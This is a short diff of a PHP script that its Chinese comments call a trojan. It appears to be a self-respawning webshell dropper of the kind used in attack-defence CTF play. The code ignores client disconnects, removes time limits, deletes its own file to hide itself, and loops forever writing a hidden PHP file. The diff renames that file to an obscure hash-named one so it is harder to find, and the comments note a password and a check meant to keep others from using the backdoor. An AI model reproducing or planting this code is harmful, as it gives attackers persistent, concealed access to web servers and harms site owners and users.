@@ -2,7 +2,7 @@
     ignore_user_abort(true); //设置与客户机断开是否会终止脚本的执行，这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行
     set_time_limit(0); //设置脚本最大执行时间，这里设置为0，即没有时间方面的限制
     unlink(__FILE__); //删除文件本身，以起到隐蔽自身的作用
-    $file = '.config.php';
+    $file = '.83411ce60d0a8b055793a1038fd80773.php';
     $code = '<?php echo "sb" ?>'; //进行校验是为了防止自家木马被其他人利用
     //pass=pass
     while (1){
